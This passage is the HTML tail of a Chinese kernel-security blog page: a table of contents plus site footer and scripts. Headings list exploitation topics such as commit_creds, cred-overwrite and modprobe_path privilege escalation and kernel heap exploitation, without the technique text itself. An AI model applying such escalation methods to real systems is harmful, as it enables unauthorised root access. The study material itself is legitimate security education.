href="#sysret"><span class="nav-text">sysret</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0"><span class="nav-text">Linux 系统调用内核实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%85%A5%E5%8F%A3"><span class="nav-text">系统调用入口</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#entry-SYSCALL-64"><span class="nav-text">entry_SYSCALL_64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#do-syscall-64"><span class="nav-text">do_syscall_64</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%BF%94%E5%9B%9E"><span class="nav-text">系统调用返回</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#do-syscall-64-1"><span class="nav-text">do_syscall_64</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#entry-SYSCALL-64-%E5%89%A9%E4%BD%99%E9%83%A8%E5%88%86"><span class="nav-text">entry_SYSCALL_64 剩余部分</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BF%AB%E9%80%9F%E8%BF%94%E5%9B%9E%E8%B7%AF%E5%BE%84%EF%BC%9Asyscall-return-via-sysret"><span class="nav-text">快速返回路径：syscall_return_via_sysret</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%85%A2%E9%80%9F%E8%BF%94%E5%9B%9E%E8%B7%AF%E5%BE%84%EF%BC%9Aswapgs-restore-regs-and-return-to-usermode"><span class="nav-text">慢速返回路径：swapgs_restore_regs_and_return_to_usermode</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kernel-pwn-%E5%A6%82%E4%BD%95%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81"><span class="nav-text">kernel pwn 如何返回用户态</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#iretq-SIGSEGV"><span class="nav-text">iretq + SIGSEGV</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#swapgs-restore-regs-and-return-to-usermode"><span class="nav-text">swapgs_restore_regs_and_return_to_usermode</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%A0%B8%E5%BF%83%E7%BB%93%E6%9E%84%E4%BD%93-task-struct"><span class="nav-text">进程核心结构体 task_struct</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">Linux 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-text">用户权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E8%A1%A8%E7%A4%BA"><span class="nav-text">用户权限表示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">相关配置文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF%EF%BC%88-etc-passwd%EF%BC%89"><span class="nav-text">账户信息（&#x2F;etc&#x2F;passwd）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%84%E4%BF%A1%E6%81%AF%EF%BC%88-etc-group%EF%BC%89"><span class="nav-text">组信息（&#x2F;etc&#x2F;group）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E7%9B%B8%E5%85%B3%EF%BC%88-etc-shadow%EF%BC%89"><span class="nav-text">密码相关（&#x2F;etc&#x2F;shadow）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3%EF%BC%88-etc-sudoers%EF%BC%8C-etc-sudoers-d-%EF%BC%89"><span class="nav-text">工具相关（&#x2F;etc&#x2F;sudoers，&#x2F;etc&#x2F;sudoers.d&#x2F;）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="nav-text">相关命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84%E4%BF%A1%E6%81%AF"><span class="nav-text">查看用户和组信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%B4%E6%94%B9%E6%9D%83%E9%99%90"><span class="nav-text">更改权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86"><span class="nav-text">用户信息管理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%9A%84%E5%86%85%E6%A0%B8%E8%A1%A8%E7%A4%BA"><span class="nav-text">用户权限的内核表示</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E7%BB%93%E6%9E%84"><span class="nav-text">用户权限管理结构</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">相关系统调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9%E8%A7%84%E5%88%99"><span class="nav-text">权限修改规则</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="nav-text">相关提权思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#commit-creds-%E6%8F%90%E6%9D%83"><span class="nav-text">commit_creds 提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E5%86%99-cred-%E6%8F%90%E6%9D%83"><span class="nav-text">覆写 cred 提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-text">文件权限</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E8%A1%A8%E7%A4%BA"><span class="nav-text">文件权限表示</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E6%9D%83%E9%99%90"><span class="nav-text">普通权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%89%B9%E6%AE%8A%E6%9D%83%E9%99%90"><span class="nav-text">特殊权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4"><span class="nav-text">相关管理命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-text">查看文件权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90"><span class="nav-text">管理文件权限</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#modprobe-path-%E6%8F%90%E6%9D%83"><span class="nav-text">modprobe_path 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">过程分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#STATIC-USERMODEHELPER-%E9%98%B2%E6%8A%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-text">STATIC_USERMODEHELPER 防护与绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F"><span class="nav-text">无文件方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CONFIG-USERMODEHELPER"><span class="nav-text">CONFIG_USERMODEHELPER</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-text">命名空间</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-text">常见命名空间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%88%87%E6%8D%A2"><span class="nav-text">命名空间切换</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#unshare-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">unshare 系统调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unshare-%E5%91%BD%E4%BB%A4"><span class="nav-text">unshare 命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text">命名空间与提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="nav-text">内存映射</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%8C%BA"><span class="nav-text">常见内存映射区</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%BF%E6%80%A7%E6%98%A0%E5%B0%84%E5%8C%BA"><span class="nav-text">线性映射区</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%8C%BA%E5%9F%9F"><span class="nav-text">虚拟内存映射区域</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#vmalloc-ioremap-space"><span class="nav-text">vmalloc&#x2F;ioremap space</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%8C%BA"><span class="nav-text">内核模块区</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#KASLR"><span class="nav-text">KASLR</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="nav-text">内核镜像地址随机化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E5%8C%BA%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="nav-text">内存映射区随机化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%9C%B0%E5%9D%80%E9%9A%8F%E6%9C%BA%E5%8C%96"><span class="nav-text">内核模块地址随机化</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#buddy-system"><span class="nav-text">buddy system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slub"><span class="nav-text">slub</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-object"><span class="nav-text">关于 object</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kmem-cache-%E5%88%9B%E5%BB%BA"><span class="nav-text">kmem_cache 创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slub-%E5%88%86%E9%85%8D"><span class="nav-text">slub 分配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slub-%E9%87%8A%E6%94%BE"><span class="nav-text">slub 释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%91%E6%A0%B8"><span class="nav-text">内核堆利用与绑核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E7%94%A8-kmalloc-flag"><span class="nav-text">通用 kmalloc flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slab-alias"><span class="nav-text">slab alias</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">内核保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3"><span class="nav-text">地址相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#KASLR-1"><span class="nav-text">KASLR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FG-KASLR"><span class="nav-text">FG_KASLR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-MMAP-MIN-ADDR"><span class="nav-text">CONFIG_MMAP_MIN_ADDR</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-RANDOMIZE-KSTACK-OFFSET"><span class="nav-text">CONFIG_RANDOMIZE_KSTACK_OFFSET</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">数据相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-HARDENED-USERCOPY"><span class="nav-text">CONFIG_HARDENED_USERCOPY</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-STACK-PROTECTOR"><span class="nav-text">CONFIG_STACK PROTECTOR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E7%9B%B8%E5%85%B3"><span class="nav-text">堆相关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-SLAB-FREELIST-HARDENED"><span class="nav-text">CONFIG_SLAB_FREELIST_HARDENED</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-SLAB-FREELIST-RANDOM"><span class="nav-text">CONFIG_SLAB_FREELIST_RANDOM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-INIT-ON-ALLOC-DEFAULT-ON"><span class="nav-text">CONFIG_INIT_ON_ALLOC_DEFAULT_ON</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CONFIG-MEMCG-KMEM"><span class="nav-text">CONFIG_MEMCG_KMEM</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        30 posts in total
                    </span>
                    
                        <span>
                            466.3k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>